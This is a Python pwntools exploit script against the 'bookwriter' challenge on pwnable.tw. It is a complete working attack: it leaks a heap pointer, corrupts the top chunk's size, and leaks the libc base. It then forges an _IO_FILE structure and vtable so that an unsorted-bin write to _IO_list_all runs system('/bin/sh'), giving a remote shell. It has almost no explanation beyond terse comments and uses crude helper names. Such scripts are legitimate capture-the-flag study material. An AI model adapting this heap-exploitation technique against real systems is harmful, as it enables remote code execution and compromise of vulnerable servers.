#coding=utf-8
from pwn import *
local = 0
exec_file="./bookwriter"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
if local :
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False) 
else:
    libc=ELF("./libc_64.so.6")
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(size, content):
    menu(1)
    a.sendlineafter("Size of page :", str(size))
    a.sendafter("Content :",content)
    return 

def info():
    menu(4)
    #a.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ", str(1))
    #a.sendlineafter("Author :", author)
    return 
    
def edit(idx,content):
    menu(3)
    a.sendlineafter("Index of page :",str(idx))
    a.sendafter("Content:",content)
    return 
    
def show(idx):
    menu(2)
    a.sendlineafter("Index of page :",str(idx))
    return 
def exp():
    a.sendafter("Author :", 'a' * 0x40)
    add(0xd60,"aaaa")#0
    add(0x1f021 - 0x1010,"aaaa")#1 adjust the topchunk's size for fake unsorted chunk

    info()
    a.recvuntil('a' * 0x40)
    heap_addr = u64(a.recv(4).ljust(0x8,"\x00"))
    fuck(heap_addr)
    a.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ", str(0))


    add(0x68,"aaaa")#2
    edit(0x2,'a' * 0x68)
    payload = 'a' * 0x68 + '\xf1'+ '\x01'#overwrite the topchunk's size


    edit(0x2, payload)

    payload = 0x100 * 'a' 
    payload += p64(0x1300) + p64(0x21) + 'a' * 0x10
    payload += p64(0) + p64(0x21) + 'a' * 0x200 
    add(0x300,payload)#3 unsorted bin  fake big unsorted bin
    '''
    payload = 'a' * (0x1f0 - 0xb0)

    payload += p64(0) + p64(0x71) + 'a' * 0x60
    payload += p64(0) + p64(0x21) + 'a' * 0x10
    payload += p64(0) + p64(0x21) + 'a' * 0x10
    '''

    payload = 'a' * 0x68 + p16(0x1301)
    edit(0x2,payload)#chunk_overlap


    add(0x1298 - (0x10 + 0xa0),"aaaaa")#4
    show(0x3)
    a.recvuntil("Content :\n")
    libc_base = u64(a.recv(6) + 2 *'\x00') -libc.sym["__malloc_hook"] - 0x10 - 88
    fuck(libc_base)

    #debug()
    add(0x110 - 0x70,"aaaa") # make size == 0x60
    payload = (0x100 - 0x60) * 'a'
    payload += "/bin/sh\x00" + p64(0x61) + p64(libc_base + libc.sym["__malloc_hook"] + 88 + 0x10) + p64(libc_base + libc.sym["_IO_list_all"] - 0x10)
    fuck_array = [p64(2), p64(3),

        'a' * 8, p64(0), # vtable
        p64(0), p64(libc_base + libc.symbols['system']),

        'a' * 0x70,
        p64(0), p64(0),
        p64(0), p64(heap_addr + 0x210d0)] # vtable_ptr
    payload += flat(fuck_array)
    print len(payload)
    edit(0x3,payload)
    menu(1)
    a.sendlineafter("Size of page :", str(0x10))
    sleep(0.5)
    a.sendline("ls")
    a.recv(2)
    #a.sendline("ls")


while 1:
    try:
        #a=process(exec_file)
        a= remote("chall.pwnable.tw",10304)
        exp()
        a.interactive()
        break
    except:
        a.close()